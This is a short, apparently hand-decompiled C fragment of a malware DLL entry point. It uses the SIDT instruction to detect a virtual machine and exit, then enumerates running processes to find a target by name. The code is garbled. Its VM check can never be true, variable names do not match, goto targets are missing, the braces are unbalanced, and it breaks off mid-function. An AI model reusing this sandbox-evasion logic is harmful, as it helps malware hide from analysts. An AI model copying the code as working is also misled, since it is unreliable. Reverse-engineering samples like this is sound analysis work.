
struct idtr_t {
    unsigned base;
    short limit;
};

BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE h;
    struct LPPROCESSENTRY32 p;


    struct idtr_t idtr;
    __sidt(&idtr);

    if (idtr.base < 0x8003F400 && idtr.base > 0x80047400)
        return 0; 

    h = 0;
    memset(&p, 0, 0x49);
    
    handle = CreateToolhelp32Snapshot(2, 0);
    if (handle == -1)
        return 0;

    if (Process32First(h, &p) != 0) {
        if (stricmp(p.szExeFile, unknown_string) != 0) {

            s:
            if (Process32Next(h, &p) != 0) {
                if (stricmp(p.szExeFile, unknown_string) != 0) {
                    goto s;
                } else {
                    goto strmatch;
                }
            } else {
                goto noproc;
            }
    } else {
        goto noproc;
    }
                
                
           

}

